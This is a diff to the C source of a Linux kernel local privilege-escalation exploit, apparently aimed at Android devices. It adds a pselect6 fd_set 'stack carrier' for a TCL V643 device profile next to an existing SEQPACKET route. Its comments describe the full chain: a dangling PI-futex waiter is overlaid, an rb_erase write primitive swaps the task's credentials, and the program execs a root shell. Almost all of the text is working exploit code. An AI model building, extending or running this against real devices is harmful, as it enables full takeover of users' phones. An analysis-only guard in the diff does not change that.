@@ -1,5 +1,6 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include "tcl_v643/pselect_carrier.h"
 #include <time.h>
 static double fops_elapsed_ms(struct timespec *ref) {
   struct timespec now;
@@ -44,9 +45,8 @@ uint64_t slide_bootid_want;
 ssize_t slide_bootid_restore_ret = -1;
 
 static int route_delay_usec(int attempt) {
-  /* With the write-plan engine active the consumer needs some head start
-   * delay so the overlay sendmsg has landed on the waiter's kernel stack
-   * before the first sched_setattr fires. */
+  /* The consumer needs enough head start for the profile-selected stack
+   * carrier to enter the kernel before the first sched_setattr fires. */
   int default_delay = pselect_custom_write_enabled() ? 50000 : -1;
   int override = env_int_range("PSELECT_ROUTE_DELAY_USEC",
                                default_delay, -1, 1000000);
@@ -422,24 +422,21 @@ static void readback_full_diff(void) {
  *   3. main:   tgkill(SIGUSR1 -> waiter). The futex returns
  *      -ERESTARTNOINTR (kernel-internal restart), the do_futex frame
  *      unwinds, the signal handler runs on the waiter in USERSPACE.
- *   4. handler: do_pselect_fake_lock_route() -> the SEQPACKET overlay
- *      sendmsg. Every syscall re-enters the kernel at the SAME stack
- *      depth (pt_regs is at the top of the kernel stack for every el0
- *      syscall), so the overlay sockaddr/iovstack land at exactly the
- *      dangling rt_waiter's address: waiter->lock = fake_lock (spray
- *      page), waiter->task = fake_task, waiter->prio = CAL_PRIO.
+ *   4. handler: do_pselect_fake_lock_route() -> the profile-selected stack
+ *      carrier. Sabrina uses SEQPACKET; TCL V643 has an exact pselect6
+ *      stack_fds mapping. Every syscall re-enters the kernel at the SAME
+ *      stack depth, so the selected frame lands at the dangling waiter.
  *   5. consumer: sched_setattr(waiter_tid, nice ladder) -> the PI chain
- *      walk fires against the overlay while the handler is blocked in
- *      sendmsg -> the rb_erase write primitive -> task->cred/real_cred =
+ *      walk fires against the overlay while the handler is blocked in its
+ *      carrier syscall -> the rb_erase write primitive -> task->cred/real_cred =
  *      fake_cred; then the consumer quiesces the page (spinlocks, tree
  *      roots, uid repair) and sets consumer_walks_done.
  *   6. main:    the getuid() poll observes the cred swap, waits for
  *      consumer_walks_done, and execs the root shell. Nothing is left
  *      spinning on a page qspinlock at that point (all walks returned
  *      before the main thread could even observe the cred change).
- *   7. handler: sendmsg times out (SO_SNDTIMEO 3s) or the exec kills the
- *      waiter thread mid-sleep (sk_stream_wait_memory is interruptible,
- *      so de_thread() can reap it). In the failure path the handler
+ *   7. handler: the selected blocking syscall times out or the exec kills
+ *      the waiter thread mid-sleep. In the failure path the handler
  *      returns, the futex syscall RESTARTS (pc rewound by the kernel at
  *      step 3), immediately times out against its original absolute
  *      deadline, and the ETIMEDOUT cleanup path
@@ -493,7 +490,7 @@ void ghost_usr1_handler(int sig) {
    * cleanup path runs over clean page state. */
 }
 
-void do_pselect_fake_lock_route(void) {
+static void do_seqpacket_fake_lock_route(void) {
   if (!page_base || !fake_lock || !fake_fops) {
     cfi_last_step = 30;
     cfi_last_errno = 0;
@@ -1005,6 +1002,198 @@ void do_pselect_fake_lock_route(void) {
   }
   pr_info("route done calls=%d success=%d step=%d errno=%d\n",
           calls, success, cfi_last_step, cfi_last_errno);
+}
+
+struct tcl_v643_saved_fd {
+  int fd;
+  int duplicate;
+};
+
+/* Install connected AF_UNIX descriptors only for bits carried by the exact
+ * V643 exceptfds bitmap.  The bitmap occupies descriptors 128..319, so the
+ * exploit's low control descriptors are not overwritten.  Existing high
+ * descriptors are duplicated and restored after pselect6 returns. */
+static int tcl_v643_install_carrier_fds(
+    const struct tcl_v643_pselect_carrier *carrier,
+    int source_fd, struct tcl_v643_saved_fd *saved, int saved_cap) {
+  int count = 0;
+
+  for (int fd = 0; fd < (int)TCL_V643_PSELECT_NFDS; fd++) {
+    if (!tcl_v643_carrier_fd_selected(carrier, (unsigned)fd)) continue;
+    if (count >= saved_cap) {
+      errno = E2BIG;
+      goto fail;
+    }
+
+    saved[count].fd = fd;
+    saved[count].duplicate = -1;
+    if (fcntl(fd, F_GETFD) >= 0) {
+      saved[count].duplicate =
+          fcntl(fd, F_DUPFD_CLOEXEC, TCL_V643_PSELECT_NFDS + 64);
+      if (saved[count].duplicate < 0) goto fail;
+    } else if (errno != EBADF) {
+      goto fail;
+    }
+
+    if (dup2(source_fd, fd) < 0) {
+      if (saved[count].duplicate >= 0) close(saved[count].duplicate);
+      goto fail;
+    }
+    count++;
+  }
+  return count;
+
+fail:
+  {
+    int saved_errno = errno;
+    for (int i = count - 1; i >= 0; i--) {
+      if (saved[i].duplicate >= 0) {
+        dup2(saved[i].duplicate, saved[i].fd);
+        close(saved[i].duplicate);
+      } else {
+        close(saved[i].fd);
+      }
+    }
+    errno = saved_errno;
+  }
+  return -1;
+}
+
+static void tcl_v643_restore_carrier_fds(
+    struct tcl_v643_saved_fd *saved, int count) {
+  for (int i = count - 1; i >= 0; i--) {
+    if (saved[i].duplicate >= 0) {
+      dup2(saved[i].duplicate, saved[i].fd);
+      close(saved[i].duplicate);
+    } else {
+      close(saved[i].fd);
+    }
+  }
+}
+
+/* Exact V643 carrier replacing the incompatible SEQPACKET/iovstack route.
+ * This implementation is compiled for review and host/QEMU validation, but
+ * the TCL profile's analysis_only guard prevents it from being reached on a
+ * device until reclaim and full-chain behavior are independently proven. */
+static void do_tcl_v643_pselect6_fake_lock_route(void) {
+  struct tcl_v643_pselect_carrier carrier;
+  struct tcl_v643_saved_fd saved[TCL_V643_PSELECT_NFDS];
+  fd_set readfds, writefds, exceptfds;
+  int sv[2] = {-1, -1};
+  int source_fd = -1;
+  int saved_count = 0;
+  int calls = 0;
+  int success = 0;
+
+  if (!page_base || !fake_lock || !fake_fops) {
+    cfi_last_step = 130;
+    cfi_last_errno = 0;
+    pr_warning("TCL pselect6 route missing prepared kernel page\n");
+    return;
+  }
+
+  uint64_t task_val = fake_task;
+  uint64_t lock_val = fake_lock;
+  uint32_t wake_state = 3;
+  int32_t prio = env_int_range("CAL_PRIO", 1, 0, 140);
+  tcl_v643_build_pselect_carrier(
+      &carrier, task_val, lock_val, wake_state, prio);
+
+  memset(&readfds, 0, sizeof(readfds));
+  memset(&writefds, 0, sizeof(writefds));
+  memset(&exceptfds, 0, sizeof(exceptfds));
+  memcpy(&readfds, carrier.readfds, sizeof(carrier.readfds));
+  memcpy(&writefds, carrier.writefds, sizeof(carrier.writefds));
+  memcpy(&exceptfds, carrier.exceptfds, sizeof(carrier.exceptfds));
+
+  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
+    cfi_last_step = 131;
+    cfi_last_errno = errno;
+    return;
+  }
+
+  /* Keep the source outside the bitmap range before installing aliases. */
+  source_fd = fcntl(sv[0], F_DUPFD_CLOEXEC, TCL_V643_PSELECT_NFDS + 32);
+  if (source_fd < 0) {
+    cfi_last_step = 132;
+    cfi_last_errno = errno;
+    goto out;
+  }
+  saved_count = tcl_v643_install_carrier_fds(
+      &carrier, source_fd, saved,
+      (int)(sizeof(saved) / sizeof(saved[0])));
+  if (saved_count < 0) {
+    cfi_last_step = 133;
+    cfi_last_errno = errno;
+    saved_count = 0;
+    goto out;
+  }
+
+  atomic_store(&consumer_calls, 0);
+  atomic_store(&consumer_success, 0);
+  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&main_route_delay_usec, route_delay_usec(1));
+  walk_poller_start();
+
+  pr_info("TCL pselect6 carrier nfds=%u task=%016llx lock=%016llx prio=%d\n",
+          TCL_V643_PSELECT_NFDS,
+          (unsigned long long)task_val,
+          (unsigned long long)lock_val, prio);
+  atomic_store(&punch_consume_go, 1);
+  errno = 0;
+  {
+    /* Keep the kernel frame resident beyond the consumer's eight-second
+     * completion budget; a timeout must not dismantle the carrier first. */
+    struct timespec timeout = {.tv_sec = 9, .tv_nsec = 0};
+    long ret = syscall(__NR_pselect6, TCL_V643_PSELECT_NFDS,
+                       &readfds, &writefds, &exceptfds,
+                       &timeout, NULL);
+    cfi_last_errno = errno;
+    pr_info("TCL pselect6 returned ret=%ld errno=%d\n", ret, cfi_last_errno);
+  }
+
+  /* The stack carrier must not be dismantled while the synchronous PI walk
+   * is still in flight. */
+  {
+    struct timespec spin_start;
+    clock_gettime(CLOCK_MONOTONIC, &spin_start);
+    while (atomic_load(&punch_consume_go) != 0) {
+      struct timespec now;
+      clock_gettime(CLOCK_MONOTONIC, &now);
+      if (now.tv_sec - spin_start.tv_sec >= 8) break;
+    }
+  }
+  usleep(50000);
+  calls = atomic_load(&consumer_calls);
+  success = atomic_load(&consumer_success);
+  cfi_last_step = calls > 0 ? 0 : 134;
+
+  readback_full_diff();
+  walk_poller_stop();
+
+out:
+  if (saved_count > 0) tcl_v643_restore_carrier_fds(saved, saved_count);
+  if (source_fd >= 0) close(source_fd);
+  if (sv[0] >= 0) close(sv[0]);
+  if (sv[1] >= 0) close(sv[1]);
+  pr_info("TCL pselect6 route done calls=%d success=%d step=%d errno=%d\n",
+          calls, success, cfi_last_step, cfi_last_errno);
+}
+
+void do_pselect_fake_lock_route(void) {
+  if (active_offsets &&
+      active_offsets->stack_overlay_route ==
+          GHOST_STACK_OVERLAY_TCL_V643_PSELECT6) {
+    if (active_offsets->analysis_only) {
+      cfi_last_step = 129;
+      cfi_last_errno = EPERM;
+      pr_warning("TCL pselect6 route refused: analysis-only profile\n");
+      return;
+    }
+    do_tcl_v643_pselect6_fake_lock_route();
+    return;
+  }
+  do_seqpacket_fake_lock_route();
 }
 
 int repair_fake_fops_llseek(int fd) {
